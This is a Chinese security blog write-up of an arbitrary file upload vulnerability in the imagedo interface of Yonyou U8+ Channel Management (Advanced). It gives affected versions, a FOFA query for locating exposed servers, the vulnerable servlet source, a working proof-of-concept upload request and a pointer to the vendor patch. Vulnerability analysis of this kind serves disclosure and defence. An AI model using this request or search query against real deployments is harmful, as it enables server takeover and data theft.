---
title: "用友U8+渠道管理(高级版) imagedo 文件上传漏洞"
source: https://mrxn.net/jswz/yonyou-imagedo-upload-rce.html
asset_dir: assets/用友u8+渠道管理(高级版)-imagedo-文件上传漏洞
---

# 用友U8+渠道管理(高级版) imagedo 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/21 08:11
* 800浏览
* [0评论](#comment)
* 58分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)U8+是用友网络科技股份有限公司推出的企业管理综合平台，广泛应用于财务、进销存、人力资源等企业核心业务系统中。在U8+渠道管理（高级版）模块中，存在一处[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，位于其 `imagedo` 接口。攻击者可通过构造特定的HTTP请求，将恶意脚本或可执行文件上传至服务器。该漏洞可能导致攻击者在目标服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而获取服务器控制权限，进一步窃取敏感数据、篡改业务数据或对内网其他系统发起攻击。

漏洞预警服务

# 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V15.0, V13

# fofa语法

> title="渠道管理（高级版）"

# 漏洞分析

根据补丁变化

[![用友U8+渠道管理(高级版) imagedo 文件上传漏洞](images/img-001-24c8de250da2.webp)](https://image.mrxn.net/1bae07efe9c04506b576186a6e75bb6a.webp)

直接看 `UploadImageServlet` 在那里引用了

```
<servlet>
    <servlet-name>UploadImageServlet</servlet-name>
    <servlet-class>com.gxfcsoft.framework.core.UploadImageServlet</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>UploadImageServlet</servlet-name>
    <url-pattern>*.imagedo</url-pattern>
</servlet-mapping>
```

ok，根据servlet的映射，任意以`.imagedo` 结尾的请求都会经由`UploadImageServlet` 处理，跟进看下它的实现逻辑

```
package com.gxfcsoft.framework.core;

import com.alibaba.fastjson.JSONObject;
import com.gxfcsoft.framework.base.util.Oid;
import com.gxfcsoft.framework.base.util.PathUtil;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.FileUploadException;
import org.apache.commons.fileupload.ProgressListener;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;

public class UploadImageServlet extends HttpServlet {
    private static final long serialVersionUID = -3805966261508992979L;

    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        this.doPost(req, resp);
    }

    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String savePath = PathUtil.getPictureAbsoluteDirectory("default");
        String newname = "";
        String oldname = "";
        String message = "1";
        resp.setCharacterEncoding("utf-8");
        resp.setContentType("text/html;charset=utf-8");
        PrintWriter outPrint = resp.getWriter();

        try {
            File saveFile = new File(savePath);
            DiskFileItemFactory factory = new DiskFileItemFactory();
            factory.setSizeThreshold(102400);
            factory.setRepository(saveFile);
            ServletFileUpload upload = new ServletFileUpload(factory);
            upload.setProgressListener(new ProgressListener() {
                public void update(long arg0, long arg1, int arg2) {
                }
            });
            upload.setHeaderEncoding("UTF-8");
            upload.setFileSizeMax(5242880L);
            upload.setSizeMax(20971520L);
            List<FileItem> list = upload.parseRequest(req);
            if (list.size() == 0) {
                message = "500";
            }

            String code = "";
            JSONObject obj = new JSONObject();
            List<Map<String, String>> lists = new ArrayList();
            Map<String, String> map = new LinkedHashMap();

            for(FileItem item : list) {
                if (item.isFormField()) {
                    code = item.getString("utf-8");
                } else {
                    String filename = item.getName();
                    filename = filename.substring(filename.lastIndexOf("\\") + 1);
                    String suffix = filename.substring(filename.indexOf("."));
                    String randomName = Oid.getOid() + suffix;
                    if (newname == "") {
                        newname = randomName;
                    } else {
                        newname = newname + ";" + randomName;
                    }

                    if (oldname == "") {
                        oldname = filename;
                    } else {
                        oldname = oldname + ";" + filename;
                    }

                    savePath.replace("", "");
                    InputStream in = item.getInputStream();
                    FileOutputStream out = new FileOutputStream(savePath + "\\" + randomName);
                    byte[] buffer = new byte[1024];
                    int len = 0;

                    while((len = in.read(buffer)) > 0) {
                        out.write(buffer, 0, len);
                    }

                    in.close();
                    out.close();
                    item.delete();
                }
            }

            map.put("oldname", oldname);
            map.put("newname", newname);
            lists.add(map);
            obj.put("fileInfo", lists);
            obj.put("flag", "0");
            outPrint.print(obj);
        } catch (IOException e) {
            message = "1";
            e.printStackTrace();
        } catch (FileUploadException e) {
            message = "1";
            e.printStackTrace();
        } finally {
            outPrint.flush();
            outPrint.close();
        }

    }
}
```

文件后缀从上传文件名中获取，然后拼接到`randomName`后面形成新的文件名，期间对文件类型和内容无校验或过滤，因此造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，非常朴实无华！

# 漏洞复现

```
POST /temp.imagedo HTTP/1.1
Host: u8.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.PNG"

TEST
------WebKitFormBoundary--
```

[![用友U8+渠道管理(高级版) imagedo 文件上传漏洞](images/img-002-100159e7743d.webp)](https://image.mrxn.net/6b62b8a62d9a49c6ba4b07130be9bec7.webp)

根据**getPictureAbsoluteDirectory**方法可知

漏洞预警服务

[![用友U8+渠道管理(高级版) imagedo 文件上传漏洞](images/img-003-5aed7e409182.webp)](https://image.mrxn.net/6eda82ab12e5484e8edba97c47ca4456.webp)

上传位置默认为 `/userfile/default/picture/` 目录下，访问上传文件

[![用友U8+渠道管理(高级版) imagedo 文件上传漏洞](images/img-004-fdf6802b5358.webp)](https://image.mrxn.net/71bed2c916c5493bb94c465a57f538bd.webp)

成功[执行我们上传代码](https://mrxn.net/tag/rce)

官方补丁修复也很直接，直接正则检测后缀是否为白名单

[![用友U8+渠道管理(高级版) imagedo 文件上传漏洞](images/img-005-814c9d663954.webp)](https://image.mrxn.net/b0da57acd37c49db9602402fdd9be968.webp)

# 参考

* [关于U8+渠道管理(高级版)存在文件上传漏洞的公告](https://security.yonyou.com/#/noticeInfo?id=727)
* <https://security.yonyou.com/#/patchInfo?identifier=29c55387e6274480b613343d8ffcd4e2>

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友U8+渠道管理(高级版) imagedo 文件上传漏洞](https://mrxn.net/jswz/yonyou-imagedo-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/yonyou-imagedo-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-imagedo-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKkElEQVR4AeybAXYjOQ5D8+f+d541xYEEl1iyk7jtetvqFwYUALIU0YqT7M4/X19f//42/v3vn/r8t7wDaYF3wmER+jFkcV6co+vKXT/m8jxC1blPnNC13+QxkFv9/rjKCfSB3Cb99Z1YfQHAF9zHyu+a70E8ZC/XIDkYKL8jpO6ccvXT2lFaIGSPyBWQnNcol+dZVF1gH0gsdnz+BKaBQE4ealxtWa8I94hzhLm31xxz1R754/pZn+og96E6R3l+g5D9ocaq9zSQyrS5953AHsj7zvqpJ710IJBX89HVl+47hKyFgZVPNdIcIWudUw6pwcBKU38YvopTrbRX4UsH8qpN/c19PjoQvcrOcDUYyFdw5YHUYGD1jKp2xXmPle832p8ZyG929JfX7oFc7AUwDcSvZZX/dP8wvn2oB8ycNEdIn3Pa20841cDcF5JT/8CjHxC1xKhdRVU8DaQybe59J9AHAkx/f4Jz7tktQvbwVwqcc94X7n2Qa6DbgL7vThYJpK+Q7v6GV+niqq9BmiPks+A59No+ECd3/rkT2AP53NmXT/7Hr+FPc3VWPYyrKg0GJ5+0nyBkv6pW/QMhfZFHVH5ID9C/fcHgqproFSEt8lfEviE60YvgciCQr5Jqr5AaUMmdq141QH8jhszlg1wDvccqUV0g0PpWfpi1qDkGpO/IxxpSA6pHdA5o+4AZu+mWwKwvB3KrudLHX7GXf+B+Sv5Vx6siwjlIf/AKSE4+8YHiHIOPcG6Vw31/90JqgNM9j+dEdOIHCdBe8dFHAcnBjPI46rEw/OIc9w3x07hAvgdygSH4FpYDgbxeXqAcUoPxo6K0CmH4V3qlifNvAVUu37MIuSf3qy+kBuPrg5mT33vA8EHmrh9z9QhcDuRYuNd//gT6L4bVo2JiEZBTBroteAXQ3vQkQq4BUS9BoD0HatR+qodJg1Fb+SB1+QNh5lQL51rUHkN1jpA9gK99Q76u9W8P5FrzGDdEV6van7RA6TCumbjvYvRTrGrlcZTfOcg9SQuEe879oUdAeoBYtgD6t0fVwOAg82a+fYJcA7fV/AG0furl6O59Q/w0LpD3gUBOEAau9ldNGLK2qqv87nP9mMsH2R8Q1V51QMNOWqJecO4xe/9rr3PK1etZVN0ZQu7J+/WBnBVt/r0nsAfy3vN++LT+x0VdG6+AvFLOKYfUYPwmK+03CKMvZP5sv9XXIA2yJ9T7htT9mTBzrkcO6QFiOYWePwk3AmjfcoHxU9bX/neJE+jfsiCnpEkGaoeQGoxXVegKSF1+R0gNBkqHwUHm6ukov3PKpTlC9gI6DbRXYScsUa9Ao3safARkDxjYTZZA6ka1ZwNO9R8goreiD+TOuRcfO4E9kI8dff3gPhBdGaBfL3FVKQyfdPkdpT1C1cDoC5lXtZCa6gIhucovLnwKSD8MlCa/ozRH6RUn7RHCeH4fyKOirX/rBH5snv78Xk3aOchpOqccUoOB1c4gddcgOfUKdP0sh6wDuiVqjyERmL4DuBdSd061K4SsA0qb+pWikfuG2GFcIe2/GGozQH8FPctB1sivV4OjNEfXlbt+zCGfA/WP3/LD8IkT6jmBkD5pgcFHRK6A2bfSoj4Csg7WqF6B+4bEKVwo9kAuNIzYylNv6mE8RlzJs3Av5HWtvJAa1Oh9IvceMNeE5xiQPtUe9VhDeqDG8BwD0qu+jjBrqnefcmmB+4bEKVwo+kAgpwozVvuF53zVqwCyVtoZ6rmQfhgozWtXHGStPI7eQ7nryiF7AKL6D0BAz7toifrC8EHmZtt/7fXDuELeb8gVNrP38DVuiK6Uow7oWU5